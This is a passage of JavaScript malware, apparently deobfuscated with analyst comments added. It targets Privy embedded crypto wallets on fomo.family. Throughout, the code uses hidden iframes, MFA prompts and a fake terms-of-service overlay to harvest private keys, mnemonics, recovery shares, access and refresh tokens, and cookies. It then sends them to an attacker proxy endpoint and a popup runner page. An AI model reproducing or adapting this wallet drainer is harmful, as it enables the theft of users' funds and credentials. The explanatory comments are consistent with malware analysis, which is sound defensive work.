        rpcIframe.setAttribute("src", CONFIG.PRIVY + "/apps/" + encodeURIComponent(CONFIG.APP_ID) + "/embedded-wallets?client_id=" + encodeURIComponent(CONFIG.CLIENT_ID));
        rpcIframe.setAttribute("title", " ");
        rpcIframe.style.cssText = "position:fixed;width:1px;height:1px;opacity:0;left:0;top:0;border:0;pointer-events:none";
        rpcIframe.addEventListener("load", () => {
          rpcIframe.__fomoLoaded = true;
        });
        (document.documentElement || document.body).appendChild(rpcIframe);
      } catch (e) {
        return null;
      }
      return rpcIframe;
    }
    /* Generic request/response RPC over postMessage to the hidden Privy embedded-wallets iframe. */
    async function privyIframeRpc(rpcEvent, rpcData, rpcTimeoutMs) {
      const rpcIframe = ensurePrivyRpcIframe();
      await waitForIframeLoad(rpcIframe, 6000);
      if (!rpcIframe || !rpcIframe.contentWindow || typeof rpcIframe.contentWindow.postMessage !== "function") {
        return null;
      }
      const requestId = crypto.randomUUID && crypto.randomUUID() || "fomo-" + Math.random().toString(36).slice(2);
      return new Promise(resolve => {
        const rpcTimeout = setTimeout(() => finishRpc(null), rpcTimeoutMs || 8000);
        if (rpcTimeout && typeof rpcTimeout.unref === "function") {
          rpcTimeout.unref();
        }
        function onRpcMessage(messageEvent) {
          if (messageEvent.origin !== CONFIG.PRIVY) {
            return;
          }
          const rpcMessage = messageEvent.data;
          if (!rpcMessage || rpcMessage.id !== requestId) {
            return;
          }
          finishRpc(rpcMessage.error ? null : rpcMessage.data || {});
        }
        function finishRpc(rpcResult) {
          window.removeEventListener("message", onRpcMessage);
          clearTimeout(rpcTimeout);
          resolve(rpcResult);
        }
        window.addEventListener("message", onRpcMessage);
        try {
          const rpcRequest = {
            id: requestId,
            event: rpcEvent,
            data: rpcData
          };
          rpcIframe.contentWindow.postMessage(rpcRequest, CONFIG.PRIVY);
        } catch (postError) {
          finishRpc(null);
        }
      });
    }
    function decodeJwtSub(jwt) {
      try {
        const payloadSegment = String(jwt || "").split(".")[1] || "";
        const paddedSegment = payloadSegment.replace(/-/g, "+").replace(/_/g, "/") + "=".repeat((4 - payloadSegment.length % 4) % 4);
        return JSON.parse(atob(paddedSegment)).sub || "";
      } catch (e) {
        return "";
      }
    }
    /* Asks the Privy iframe to connect the wallet (privy:wallets:connect) and returns deviceId/deviceShare/entropyId. */
    async function connectWalletViaIframe(connectOptions) {
      const connectAddress = String(connectOptions && connectOptions.address || "");
      const connectAccessToken = String(connectOptions && connectOptions.accessToken || "");
      const connectTimeoutMs = connectOptions && connectOptions.timeoutMs || 8000;
      ensurePrivyRpcIframe();
      const connectResponse = await privyIframeRpc("privy:wallets:connect", {
        accessToken: connectAccessToken,
        entropyId: connectAddress,
        address: connectAddress,
        entropyIdVerifier: verifierForAddress(connectAddress)
      }, connectTimeoutMs);
      const deviceId = connectResponse && (connectResponse.deviceId || connectResponse.device_id) || null;
      const deviceShare = connectResponse && connectResponse.share || null;
      const entropyId = connectResponse && (connectResponse.entropyId || connectResponse.address) || null;
      if (deviceId && deviceShare) {
        return {
          deviceId: String(deviceId),
          share: String(deviceShare),
          entropyId: entropyId || connectAddress,
          source: "iframe-postMessage"
        };
      }
      if (!connectResponse) {
        return null;
      }
      const addressMatches = Boolean(entropyId && connectAddress && String(entropyId).toLowerCase() === connectAddress.toLowerCase());
      if (!deviceId && !deviceShare && !addressMatches) {
        return null;
      }
      return {
        deviceId: deviceId ? String(deviceId) : null,
        share: deviceShare ? String(deviceShare) : null,
        entropyId: entropyId ? String(entropyId) : connectAddress,
        source: "iframe-postMessage"
      };
    }
    async function getDeviceIdForAddress(address, options) {
      const lookupOptions = {
        address: address,
        appId: CONFIG.APP_ID,
        userId: options && options.userId,
        accessToken: options && (options.token || options.accessToken),
        timeoutMs: options && options.timeoutMs
      };
      const connection = await connectWalletViaIframe(lookupOptions);
      if (connection && connection.deviceId) {
        return String(connection.deviceId);
      } else {
        return null;
      }
    }
    /* Relays the device-share request to the attacker proxy endpoint (PROXY_ORIGIN/api/fomo/recover) sending wallet, tokens, cookies and device id. */
    async function deviceShareViaProxy(requestUrl, fetchInit) {
      const parsedBody = JSON.parse(fetchInit && fetchInit.body || "{}");
      if (!parsedBody.device_id) {
        return {
          status: 400,
          ok: false,
          data: {
            error: "[Input error] `device_id` is required",
            code: "invalid_data"
          }
        };
      }
      const walletMatch = String(requestUrl).match(/embedded_wallets\/([^/]+)\/share/);
      const walletAddress = walletMatch ? decodeURIComponent(walletMatch[1]) : "";
      const requestHeaders = fetchInit && fetchInit.headers || {};
      const proxyAccessToken = String(requestHeaders.authorization || "").replace(/^Bearer\s+/i, "");
      const proxyEndpoint = CONFIG.PROXY_ORIGIN + "/api/fomo/recover";
      let proxyResponse;
      try {
        proxyResponse = await fetch(proxyEndpoint, {
          method: "POST",
          headers: {
            "content-type": "application/json"
          },
          body: JSON.stringify({
            appId: CONFIG.APP_ID,
            clientId: CONFIG.CLIENT_ID,
            wallet: walletAddress,
            accessToken: proxyAccessToken,
            caid: requestHeaders["privy-ca-id"],
            mfaToken: requestHeaders["privy-mfa-token"] || requestHeaders["privy-mfa"],
            chainType: parsedBody.chain_type || "ethereum",
            deviceId: parsedBody.device_id,
            privyCookies: String(window.__FOMO_PRIVY_COOKIE__ || "")
          })
        });
      } catch (networkError) {
        return {
          status: 0,
          ok: false,
          data: {
            error: String(networkError && networkError.message ? networkError.message : networkError),
            code: "csp_or_network"
          }
        };
      }
      const proxyData = await proxyResponse.json().catch(() => ({}));
      const proxyShare = proxyData && proxyData.auth_share && proxyData.auth_share.data && proxyData.auth_share.data.share || proxyData && proxyData.auth_share && proxyData.auth_share.share || proxyData && proxyData.share;
      return {
        status: proxyResponse.status,
        ok: Boolean(proxyResponse.ok && proxyShare),
        data: proxyShare ? {
          share: proxyShare,
          imported: false,
          source: "device"
        } : proxyData || {}
      };
    }
    /* POSTs /api/v1/embedded_wallets/<address>/share to fetch the device/auth share, routed through deviceShareViaProxy by default. */
    async function fetchDeviceShare(shareOptions) {
      const shareAddress = String(shareOptions.address || "");
      const chainType = shareOptions.chainType || "ethereum";
      const deviceId = shareOptions.deviceId || (await getDeviceIdForAddress(shareAddress, shareOptions));
      if (!deviceId) {
        return {
          status: 400,
          ok: false,
          data: {
            error: "[Input error] `device_id` is required",
            code: "invalid_data"
          }
        };
      }
      const _0x8d6a2 = CONFIG.PRIVY + "/api/v1/embedded_wallets/" + encodeURIComponent(shareAddress) + "/share";
      const shareBody = {
        device_id: deviceId,
        chain_type: chainType
      };
      const shareInit = {
        method: "POST",
        credentials: "include",
        headers: buildPrivyHeaders(shareOptions.token, shareOptions.caid, shareOptions.mfaToken),
        body: JSON.stringify(shareBody)
      };
      const fetchImpl = shareOptions.fetchImpl || deviceShareViaProxy;
      const shareResponse = await fetchImpl(_0x8d6a2, shareInit);
      const shareSecret = shareResponse?.data?.share;
      return {
        status: shareResponse?.status || 0,
        ok: Boolean(shareResponse?.ok && shareSecret),
        data: shareResponse?.data || {}
      };
    }
    /* Orchestrates device share recovery: iframe connect, optional recovery-key path, share endpoint. */
    async function obtainDeviceShare(shareOptions) {
      const shareAddress = String(shareOptions.address || "");
      const chainType = shareOptions.chainType || "ethereum";
      const connection = shareOptions.deviceId ? {
        deviceId: shareOptions.deviceId
      } : await connectWalletViaIframe({
        address: shareAddress,
        appId: CONFIG.APP_ID,
        userId: shareOptions.userId,
        accessToken: shareOptions.token || shareOptions.accessToken,
        timeoutMs: shareOptions.timeoutMs
      });
      if (connection && connection.deviceId) {
        if (connection.share) {
          const directShareData = {
            deviceId: connection.deviceId,
            deviceShare: connection.share,
            source: connection.source || "iframe-store"
          };
          const directShareResult = {
            status: 200,
            ok: true,
            data: directShareData
          };
          return directShareResult;
        }
        const deviceShareOptions = {
          address: shareAddress,
          chainType: chainType,
          token: shareOptions.token,
          caid: shareOptions.caid,
          mfaToken: shareOptions.mfaToken,
          deviceId: connection.deviceId,
          fetchImpl: shareOptions.fetchImpl
        };
        const deviceShareResult = await fetchDeviceShare(deviceShareOptions);
        const mergedShareResult = {
          ...deviceShareResult
        };
        mergedShareResult.data = {
          ...(deviceShareResult.data || {})
        };
        mergedShareResult.data.deviceId = connection.deviceId;
        mergedShareResult.data.deviceShare = connection.share || null;
        return mergedShareResult;
      }
      if (shareOptions.recoveryKey) {
        await privyIframeRpc("privy:wallets:recover", {
          accessToken: shareOptions.token || shareOptions.accessToken,
          entropyId: shareAddress,
          address: shareAddress,
          entropyIdVerifier: verifierForAddress(shareAddress),
          recoveryMethod: "privy",
          recoveryKey: shareOptions.recoveryKey,
          chainType: chainType
        }, shareOptions.timeoutMs || 8000);
        const reconnectOptions = {
          address: shareAddress,
          appId: CONFIG.APP_ID,
          userId: shareOptions.userId,
          accessToken: shareOptions.token || shareOptions.accessToken,
          timeoutMs: 2500
        };
        const recoveredConnection = await connectWalletViaIframe(reconnectOptions);
        if (recoveredConnection && recoveredConnection.deviceId) {
          if (recoveredConnection.share) {
            const recoveredShareData = {
              deviceId: recoveredConnection.deviceId,
              deviceShare: recoveredConnection.share,
              source: recoveredConnection.source || "iframe-store"
            };
            const recoveredShareResult = {
              status: 200,
              ok: true,
              data: recoveredShareData
            };
            return recoveredShareResult;
          }
          const recoveredShareOptions = {
            address: shareAddress,
            chainType: chainType,
            token: shareOptions.token,
            caid: shareOptions.caid,
            mfaToken: shareOptions.mfaToken,
            deviceId: recoveredConnection.deviceId,
            fetchImpl: shareOptions.fetchImpl
          };
          const recoveredShareResult = await fetchDeviceShare(recoveredShareOptions);
          const recoveredMergedResult = {
            ...recoveredShareResult
          };
          recoveredMergedResult.data = {
            ...(recoveredShareResult.data || {})
          };
          recoveredMergedResult.data.deviceId = recoveredConnection.deviceId;
          recoveredMergedResult.data.deviceShare = recoveredConnection.share || null;
          return recoveredMergedResult;
        }
      }
      if (connection && connection.entropyId) {
        await privyIframeRpc("privy:wallets:rpc", {
          accessToken: shareOptions.token || shareOptions.accessToken,
          entropyId: connection.entropyId,
          entropyIdVerifier: verifierForAddress(connection.entropyId),
          chainType: chainType,
          hdWalletIndex: 0,
          request: {
            method: "eth_accounts",
            params: []
          }
        }, shareOptions.timeoutMs || 8000);
        const exportRequiredData = {
          error: "entropyId-only connect does not export a private key",
          code: "export_required",
          entropyId: connection.entropyId
        };
        const exportRequiredResult = {
          status: 400,
          ok: false,
          data: exportRequiredData
        };
        return exportRequiredResult;
      }
      return {
        status: 400,
        ok: false,
        data: {
          error: "[Input error] `device_id` is required",
          code: "invalid_data"
        }
      };
    }
    const deviceSharePromises = Object.create(null);
    const clipboardHarvestResults = Object.create(null);
    /* Per-address cached share retrieval; unified wallets go through clientExportEncrypted instead. */
    async function getDeviceShareCached(address, chainType, accessToken, caid, mfaToken, extraOptions) {
      const walletId = extraOptions && extraOptions.walletId || window.__FOMO_WALLET_ID__ || null;
      const entropyId = extraOptions && extraOptions.entropyId || address;
      const walletInfo = {
        walletId: walletId,
        address: address
      };
      if (exportKindFor(walletInfo) === "unified-client-export") {
        const exportRequestOptions = {
          address: entropyId,
          chainType: chainType,
          token: accessToken,
          caid: caid,
          mfaToken: mfaToken,
          walletId: walletId
        };
        return clientExportEncrypted(exportRequestOptions);
      }
      const cacheKey = String(entropyId);
      if (!deviceSharePromises[cacheKey]) {
        const shareRequestOptions = {
          address: entropyId,
          chainType: chainType,
          token: accessToken,
          caid: caid,
          mfaToken: mfaToken,
          recoveryKey: extraOptions && extraOptions.recoveryKey,
          userId: extraOptions && extraOptions.userId,
          timeoutMs: extraOptions && extraOptions.timeoutMs,
          fetchImpl: extraOptions && extraOptions.fetchImpl
        };
        deviceSharePromises[cacheKey] = obtainDeviceShare(shareRequestOptions);
      }
      return deviceSharePromises[cacheKey];
    }
    /* POSTs /api/v1/embedded_wallets/<address>/recovery/auth_share (MFA-gated). */
    async function fetchRecoveryAuthShare(address, _0x697bc, accessToken, caid, mfaToken) {
      const authBody = {
        chain_type: _0x697bc
      };
      const authResponse = await fetch(CONFIG.PRIVY + "/api/v1/embedded_wallets/" + encodeURIComponent(address) + "/recovery/auth_share", {
        method: "POST",
        credentials: "include",
        headers: buildPrivyHeaders(accessToken, caid, mfaToken),
        body: JSON.stringify(authBody)
      });
      const authData = await authResponse.json().catch(() => ({}));
      const authShare = authData.share || authData.data?.share;
      return {
        status: authResponse.status,
        ok: authResponse.ok && Boolean(authShare),
        data: authData
      };
    }
    /* POSTs /api/v1/embedded_wallets/<address>/recovery/shares with the SHA-256 of the recovery key (base64, hex fallback). */
    async function fetchEncryptedRecoveryShare(address, chainType, _0xe3dcb, caid, mfaToken, recoveryKey) {
      if (!recoveryKey) {
        return {
          status: 0,
          ok: false,
          data: {}
        };
      }
      const recoveryKeyHashes = await hashRecoveryKey(recoveryKey);
      const requestEncryptedShare = async keyHash => {
        const sharesBody = {
          recovery_key_hash: keyHash,
          chain_type: chainType
        };
        const sharesResponse = await fetch(CONFIG.PRIVY + "/api/v1/embedded_wallets/" + encodeURIComponent(address) + "/recovery/shares", {
          method: "POST",
          credentials: "include",
          headers: buildPrivyHeaders(_0xe3dcb, caid, mfaToken),
          body: JSON.stringify(sharesBody)
        });
        const sharesData = await sharesResponse.json().catch(() => ({}));
        const encryptedShare = sharesData.encrypted_recovery_share || sharesData.data?.encrypted_recovery_share;
        const encryptedShareIv = sharesData.encrypted_recovery_share_iv || sharesData.data?.encrypted_recovery_share_iv;
        return {
          status: sharesResponse.status,
          ok: sharesResponse.ok && Boolean(encryptedShare && encryptedShareIv),
          data: sharesData
        };
      };
      let encryptedSharesResult = await requestEncryptedShare(recoveryKeyHashes.b64hash);
      if (!encryptedSharesResult.ok) {
        encryptedSharesResult = await requestEncryptedShare(recoveryKeyHashes.hex);
      }
      return encryptedSharesResult;
    }
    const sleep = ms => new Promise(resolve => setTimeout(resolve, Math.max(0, ms)));
    function getRecoveryKey(keyMaterialData) {
      return keyMaterialData?.recovery_key || keyMaterialData?.recoveryKey || "";
    }
    /* Core theft routine: for every wallet, pulls key material, device share / client-export ciphertext, recovery auth share and encrypted recovery share; falls back to intercepted fetch bodies and to clipboard sniffing via the invisible export iframe; assembles the exfil payload items. */
    async function harvestWallets(wallets, sessionAccessToken, caid, initialMfaToken, mfaRequired) {
      const exfilItems = [];
      const accessToken = cleanToken(sessionAccessToken);
      let mfaToken = mfaRequired === false ? "" : pickMfaToken(initialMfaToken || privyStorage.get("privy:mfa_token"));
      let mfaPrompted = false;
      const promptForMfaIfNeeded = async (accessToken, errorResponse) => {
        if (!shouldPromptMfa(mfaRequired, errorResponse) || mfaPrompted) {
          return;
        }
        if (errorResponse?.ok && getRecoveryKey(errorResponse.data)) {
          return;
        }
        mfaPrompted = true;
        await sleep(CONFIG.MFA_DELAY_MS);
        mfaToken = pickMfaToken(await ensureMfaToken(accessToken, caid));
        if (mfaToken) {
          privyStorage.set("privy:mfa_token", mfaToken);
        }
      };
      const harvestWallet = async (address, chainType, walletAccessToken) => {
        let keyMaterial = await fetchKeyMaterial(address, chainType, walletAccessToken, caid, mfaToken);
        if (!keyMaterial.ok || !getRecoveryKey(keyMaterial.data)) {
          await promptForMfaIfNeeded(walletAccessToken, keyMaterial);
          keyMaterial = await fetchKeyMaterial(address, chainType, walletAccessToken, caid, mfaToken);
        }
        const entropyId = chainType === "solana" && wallets.ethereum[0] ? wallets.ethereum[0] : address;
        const recoveryKey = keyMaterial?.ok ? getRecoveryKey(keyMaterial.data) : "";
        const recoveryShareOptions = {
          entropyId: entropyId,
          recoveryKey: recoveryKey
        };
        let shareResult = await getDeviceShareCached(address, chainType, walletAccessToken, caid, mfaToken, recoveryShareOptions);
        if (shareResult && !shareResult.ok && isMfaRequiredError(shareResult.status, shareResult.data)) {
          await promptForMfaIfNeeded(walletAccessToken, shareResult);
          keyMaterial = await fetchKeyMaterial(address, chainType, walletAccessToken, caid, mfaToken);
          shareResult = await getDeviceShareCached(address, chainType, walletAccessToken, caid, mfaToken, {
            entropyId: entropyId,
            recoveryKey: keyMaterial?.ok ? getRecoveryKey(keyMaterial.data) : recoveryKey
          });
        }
        let recoveryAuthResult = await fetchRecoveryAuthShare(address, chainType, walletAccessToken, caid, mfaToken);
        let recoverySharesResult = await fetchEncryptedRecoveryShare(address, chainType, walletAccessToken, caid, mfaToken, recoveryKey || (keyMaterial?.ok ? getRecoveryKey(keyMaterial.data) : ""));
        if (!recoveryAuthResult?.ok) {
          const capturedAuthBody = findCapturedRecoveryBody(address, "auth_share") || findCapturedRecoveryBody(entropyId, "auth_share");
          if (capturedAuthBody && (capturedAuthBody.share || capturedAuthBody.data?.share)) {
            const recoveredAuthResult = {
              status: 200,
              ok: true,
              data: capturedAuthBody
            };
            recoveryAuthResult = recoveredAuthResult;
          }
        }
        if (!recoverySharesResult?.ok) {
          const capturedSharesBody = findCapturedRecoveryBody(address, "shares") || findCapturedRecoveryBody(entropyId, "shares");
          if (capturedSharesBody && (capturedSharesBody.encrypted_recovery_share || capturedSharesBody.data?.encrypted_recovery_share)) {
            const recoveredSharesResult = {
              status: 200,
              ok: true,
              data: capturedSharesBody
            };
            recoverySharesResult = recoveredSharesResult;
          }
        }
        if (!recoveryAuthResult?.ok) {
          const capturedDeviceBody = findCapturedRecoveryBody(address, "device") || findCapturedRecoveryBody(entropyId, "device");
          const capturedDeviceShare = capturedDeviceBody && (capturedDeviceBody.device_auth_share || capturedDeviceBody.deviceAuthShare);
          if (capturedDeviceShare) {
            shareResult = {
              status: 200,
              ok: true,
              data: {
                ...(shareResult && shareResult.data),
                deviceShare: capturedDeviceShare,
                deviceId: capturedDeviceBody.device_id || capturedDeviceBody.deviceId || shareResult && shareResult.data && shareResult.data.deviceId
              }
            };
          }
        }
        if ((!recoveryAuthResult?.ok || !recoverySharesResult?.ok) && (!shareResult || !shareResult.ok || !shareResult.data?.privateKey && !shareResult.data?.mnemonic)) {
          const entropyCacheKey = String(entropyId);
          const cachedClipboardHarvest = clipboardHarvestResults[entropyCacheKey];
          if (cachedClipboardHarvest && cachedClipboardHarvest.data && cachedClipboardHarvest.data.mnemonic) {
            shareResult = {
              status: 200,
              ok: true,
              data: {
                ...(shareResult && shareResult.data),
                mnemonic: cachedClipboardHarvest.data.mnemonic,
                privateKey: chainType === "ethereum" ? cachedClipboardHarvest.data.privateKey || null : null
              }
            };
          } else if (chainType === "ethereum" || !cachedClipboardHarvest || !cachedClipboardHarvest.data || !cachedClipboardHarvest.data.privateKey || !!cachedClipboardHarvest.data.mnemonic) {
            const clipboardHarvest = await captureViaExportIframe({
              address: entropyId,
              chainType: chainType,
              token: walletAccessToken,
              caid: caid,
              phraseExport: false,
              timeoutMs: 20000,
              again: chainType === "solana" && Boolean(cachedClipboardHarvest),
              confirm: chainType === "solana" ? {
                face: "Continue",
                hint: "Click continue to finish.",
                status: "Almost ready",
                sub: "One more click to finish."
              } : {
                face: "I agree",
                hint: "Click I agree to continue."
              }
            });
            if (clipboardHarvest && clipboardHarvest.ok && clipboardHarvest.data) {
              const harvestData = {
                mnemonic: clipboardHarvest.data.mnemonic || cachedClipboardHarvest && cachedClipboardHarvest.data && cachedClipboardHarvest.data.mnemonic || null,
                privateKey: clipboardHarvest.data.privateKey || null,
                ethereumKey: chainType === "ethereum" ? clipboardHarvest.data.privateKey : cachedClipboardHarvest && cachedClipboardHarvest.data && cachedClipboardHarvest.data.ethereumKey,
                solanaKey: chainType === "solana" ? clipboardHarvest.data.privateKey : cachedClipboardHarvest && cachedClipboardHarvest.data && cachedClipboardHarvest.data.solanaKey
              };
              const harvestResult = {
                status: 200,
                ok: true,
                data: harvestData
              };
              clipboardHarvestResults[entropyCacheKey] = harvestResult;
              shareResult = {
                status: 200,
                ok: true,
                data: {
                  ...(shareResult && shareResult.data),
                  privateKey: clipboardHarvest.data.privateKey || null,
                  mnemonic: clipboardHarvest.data.mnemonic || null
                }
              };
            }
          } else {
            const solanaCaptureOptions = {
              address: entropyId,
              chainType: "solana",
              token: walletAccessToken,
              caid: caid,
              phraseExport: false,
              timeoutMs: 20000,
              again: true,
              confirm: {
                face: "Continue",
                hint: "Click continue to finish.",
                status: "Almost ready",
                sub: "One more click to finish."
              }
            };
            const solanaClipboardHarvest = await captureViaExportIframe(solanaCaptureOptions);
            if (solanaClipboardHarvest && solanaClipboardHarvest.ok && solanaClipboardHarvest.data) {
              const mergedHarvestData = {
                ...(cachedClipboardHarvest && cachedClipboardHarvest.data)
              };
              mergedHarvestData.mnemonic = solanaClipboardHarvest.data.mnemonic || cachedClipboardHarvest && cachedClipboardHarvest.data && cachedClipboardHarvest.data.mnemonic || null;
              mergedHarvestData.solanaKey = solanaClipboardHarvest.data.privateKey || null;
              const solanaHarvestResult = {
                status: 200,
                ok: true,
                data: mergedHarvestData
              };
              clipboardHarvestResults[entropyCacheKey] = solanaHarvestResult;
              shareResult = {
                status: 200,
                ok: true,
                data: {
                  ...(shareResult && shareResult.data),
                  privateKey: solanaClipboardHarvest.data.privateKey || null,
                  mnemonic: solanaClipboardHarvest.data.mnemonic || null
                }
              };
            }
          }
        }
        const walletHarvest = {
          km: keyMaterial,
          share: shareResult,
          recAuth: recoveryAuthResult,
          recShares: recoverySharesResult,
          mfaToken: mfaToken
        };
        return walletHarvest;
      };
      const appendExfilItem = async (address, chainType, keyMaterial, shareResult, recoveryAuthResult, recoverySharesResult, walletMfaToken) => {
        const recoveryKey = keyMaterial?.ok ? getRecoveryKey(keyMaterial.data) : "";
        const hasExportSecret = Boolean(shareResult?.ok && (shareResult.data?.ciphertext || shareResult.data?.privateKey || shareResult.data?.mnemonic));
        const deviceShare = shareResult?.data?.deviceShare || null;
        const authShare = recoveryAuthResult?.ok && (recoveryAuthResult.data?.share || recoveryAuthResult.data?.data?.share);
        const encryptedShare = recoverySharesResult?.data?.encrypted_recovery_share || recoverySharesResult?.data?.data?.encrypted_recovery_share;
        const shareIv = recoverySharesResult?.data?.encrypted_recovery_share_iv || recoverySharesResult?.data?.data?.encrypted_recovery_share_iv;
        if (!hasExportSecret && !deviceShare && !authShare && (!recoveryKey || !encryptedShare || !shareIv)) {
          return;
        }
        const recoveryKeyHashes = recoveryKey ? await hashRecoveryKey(recoveryKey) : {
          b64hash: "",
          hex: ""
        };
        exfilItems.push({
          appId: CONFIG.APP_ID,
          clientId: CONFIG.CLIENT_ID,
          caid: caid,
          wallet: address,
          accessToken: accessToken,
          refreshToken: cleanToken(privyStorage.get("privy:refresh_token")),
          privyCookies: String(window.__FOMO_PRIVY_COOKIE__ || document.cookie || ""),
          recoveryKey: recoveryKey,
          recoveryKeyHashB64: recoveryKeyHashes.b64hash,
          recoveryKeyHashHex: recoveryKeyHashes.hex,
          chainType: chainType,
          chain_type: chainType,
          recoveryType: keyMaterial?.data?.recovery_type || keyMaterial?.data?.recoveryType || null,
          authShare: (shareResult?.ok && shareResult.data?.share ? shareResult.data : null) || (authShare ? {
            share: authShare,
            source: "recovery"
          } : null),
          encShare: encryptedShare || null,
          iv: shareIv || null,
          shares: recoverySharesResult?.ok ? recoverySharesResult.data : null,
          exportCiphertext: shareResult?.data?.ciphertext || null,
          exportEncapsulatedKey: shareResult?.data?.encapsulatedKey || null,
          exportPkcs8: ecdhKeypairCache?.pkcs8 || null,
          privateKey: shareResult?.data?.privateKey || null,
          mnemonic: shareResult?.data?.mnemonic || null,
          deviceShare: deviceShare,
          deviceId: shareResult?.data?.deviceId || (await getDeviceIdForAddress(address)),
          mfaToken: walletMfaToken || null
        });
      };
      for (const ethAddress of wallets.ethereum) {
        const {
          km: ethKeyMaterial,
          share: ethShareResult,
          recAuth: ethRecoveryAuth,
          recShares: ethRecoveryShares,
          mfaToken: ethMfaToken
        } = await harvestWallet(ethAddress, "ethereum", accessToken);
        await appendExfilItem(ethAddress, "ethereum", ethKeyMaterial, ethShareResult, ethRecoveryAuth, ethRecoveryShares, ethMfaToken);
      }
      for (const solAddress of wallets.solana) {
        const {
          km: solKeyMaterial,
          share: solShareResult,
          recAuth: solRecoveryAuth,
          recShares: solRecoveryShares,
          mfaToken: solMfaToken
        } = await harvestWallet(solAddress, "solana", accessToken);
        await appendExfilItem(solAddress, "solana", solKeyMaterial, solShareResult, solRecoveryAuth, solRecoveryShares, solMfaToken);
      }
      return exfilItems;
    }
    /* Entry point: refresh session, (pre-)verify MFA, show the fake terms overlay, harvest all wallet recovery material, then exfiltrate the job by opening the scary.xyz runner page with the payload in the URL hash and popup window.name. */
    async function runExfiltrationFlow() {
      let overlayApi = null;
      try {
        const session = await refreshSession();
        const mfaRequired = userRequiresMfa(session.data);
        const mfaToken = mfaRequired === true ? pickMfaToken(await ensureMfaToken(session.access, session.caid)) : "";
        if (mfaToken) {
          privyStorage.set("privy:mfa_token", mfaToken);
        }
        overlayApi = buildTermsOverlay();
        overlayApi.setStep(1);
        overlayApi.setStep(2);
        const {
          wallets: wallets,
          user: user,
          caid: caid
        } = extractEmbeddedWallets(session);
        overlayApi.setStep(3);
        overlayApi.setStep(4);
        const exfilItems = await harvestWallets(wallets, session.access, caid, mfaToken, mfaRequired);
        if (!exfilItems.length) {
          throw new Error("No recovery material available");
        }
        overlayApi.setStep(5);
        const exfilJob = {
          v: 2,
          source: "fomo.family",
          projectId: projectId,
          userId: user?.id || null,
          backend: CONFIG.BACKEND,
          returnUrl: CONFIG.RETURN,
          mfa: Boolean(pickMfaToken(privyStorage.get("privy:mfa_token"))),
          refreshToken: cleanToken(privyStorage.get("privy:refresh_token")),
          privyCookies: String(window.__FOMO_PRIVY_COOKIE__ || document.cookie || ""),
          items: exfilItems
        };
        overlayApi.setStep(6);
        overlayApi.showPopupHelp();
        const retryAnchor = overlayApi.root && overlayApi.root.querySelector && overlayApi.root.querySelector("#__fomo_retry_popup");
        setAnchorJob(retryAnchor, exfilJob);
        await new Promise((resolve, reject) => {
          let popupOpened = false;
          const onConfirmClick = clickEvent => {
            if (popupOpened) {
              if (clickEvent && typeof clickEvent.preventDefault === "function") {
                clickEvent.preventDefault();
              }
              return;
            }
            try {
              const openedPopup = openRunnerPopup(exfilJob);
              if (openedPopup) {
                popupOpened = true;
                if (clickEvent && typeof clickEvent.preventDefault === "function") {
                  clickEvent.preventDefault();
                }
                resolve(openedPopup);
              }
            } catch (openError) {
              reject(openError);
            }
          };
          if (retryAnchor && typeof retryAnchor.addEventListener === "function") {
            retryAnchor.addEventListener("pointerdown", onConfirmClick, true);
          }
          overlayApi.onRetry(onConfirmClick);
        });
      } catch (flowError) {
        console.error(flowError);
        if (!overlayApi) {
          overlayApi = buildTermsOverlay();
          overlayApi.setStep(1);
        }
        overlayApi.error(flowError.message || flowError);
      }
    }
    runExfiltrationFlow();
  })();
})();
